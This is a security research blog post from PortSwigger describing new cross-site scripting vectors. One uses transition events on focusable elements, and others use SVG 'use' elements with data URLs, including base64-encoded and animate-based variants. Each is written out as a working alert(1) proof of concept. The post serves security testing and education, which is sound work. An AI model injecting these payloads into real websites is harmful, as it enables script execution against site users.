---
source: portswigger-research
source_url: https://portswigger.net/research/new-xss-vectors
title: "New XSS vectors | PortSwigger Research"
published: 2022-04-20T14:00:00
description: "Transition based events without style blocks So, recently, I was updating our XSS cheat sheet to fix certain vectors that had been made obsolete by browser updates. Whilst looking at the vectors, the"
---

# New XSS vectors

![Gareth Heyes](https://portswigger.net/content/images/profiles/callout_gareth_heyes_114px.png)

### [Gareth Heyes](https://portswigger.net/research/gareth-heyes)

Researcher

[@garethheyes](https://twitter.com/garethheyes)

- **Published:** Wednesday, 20 April 2022 at 14:00 UTC

- **Updated:** Wednesday, 20 April 2022 at 14:07 UTC


![A code snippet showing a new XSS vector](https://portswigger.net/cms/images/f0/b8/8092-article-new-xss-vectors-article.png)

### Transition based events without style blocks

So, recently, I was updating our [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) to fix certain vectors that had been made obsolete by browser updates. Whilst looking at the vectors, the transition events stuck in my head. They needed a style block as well as the event:

`<style>:target {color:red;}</style>
<xss id=x style="transition:color 1s" ontransitionend=alert(1)></xss>`

I wanted to remove the requirement of a style block. I wondered what browser styles are added by default? I did a bit of Googling and a [page on W3Schools](https://www.w3schools.com/cssref/css_default_values.asp) led me to my discovery. Certain tags had focus selectors - this was super interesting, because that would mean that a transition would work with them! Looking through the list I noticed that outline was being used and then I remembered that Chrome puts an outline around an element when you make it focusable for accessibility.

This meant we could remove the requirement of the style block if we applied the transition to the outline property. This vector works with any focusable tag:

`<xss style="display:block;transition:outline 1s;" ontransitionend=alert(1) id=x tabindex=1>test</xss>`

Proper [XSS](https://portswigger.net/web-security/cross-site-scripting) hacking! Just like the old days.

### SVG "use" element vectors

A while ago I found some nice SVG-based vectors that you might not be familiar with. A recent browser update had modified the behaviour of Chrome and Firefox's "use" element. You now can automatically execute JavaScript with embedded SVG inside data URLs of a "use" element:

`<svg><use href="data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluaycgd2lkdGg9JzEwMCcgaGVpZ2h0PScxMDAnPgo8aW1hZ2UgaHJlZj0iMSIgb25lcnJvcj0iYWxlcnQoMSkiIC8+Cjwvc3ZnPg==#x" /></svg>`

Here's the base64 decoded:

`<svg id='x' xmlns='http://www.w3.org/2000/svg'
xmlns:xlink='http://www.w3.org/1999/xlink' width='100' height='100'>
<image href="1" onerror="alert(1)" />
</svg>`

Although you don't have to use base64 of course - you could also do this:

`<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><image href='1' onerror='alert(1)' /></svg>#x" />`

Finally, you can use animate tags to change the href of the "use" element to cause JavaScript execution:

`<svg><animate xlink:href="#x" attributeName="href" values="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'>
<image href='1' onerror='alert(1)' /></svg>#x" />
<use id=x />`

If you liked these vectors and want to learn more, I'd recommend the [XSS section on our Web Security Academy](https://portswigger.net/web-security/cross-site-scripting) where you can hone your skills with our interactive labs - or visit our [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) to find even more.

[XSS](https://portswigger.net/research/cross-site-scripting-research) [vectors](https://portswigger.net/research/vectors) [Cross Site Scripting](https://portswigger.net/research/cross-site-scripting)

[Back to all articles](https://portswigger.net/research/articles)

## Related Research

[**Cookie Chaos: How to bypass \_\_Host and \_\_Secure cookie prefixes** 03 September 2025Cookie Chaos: How to bypass \_\_Host and \_\_Secure cookie prefixes](https://portswigger.net/research/cookie-chaos-how-to-bypass-host-and-secure-cookie-prefixes) [**Stealing HttpOnly cookies with the cookie sandwich technique** 22 January 2025Stealing HttpOnly cookies with the cookie sandwich technique](https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique) [**Bypassing WAFs with the phantom $Version cookie** 04 December 2024Bypassing WAFs with the phantom $Version cookie](https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie) [**Concealing payloads in URL credentials** 23 October 2024Concealing payloads in URL credentials](https://portswigger.net/research/concealing-payloads-in-url-credentials)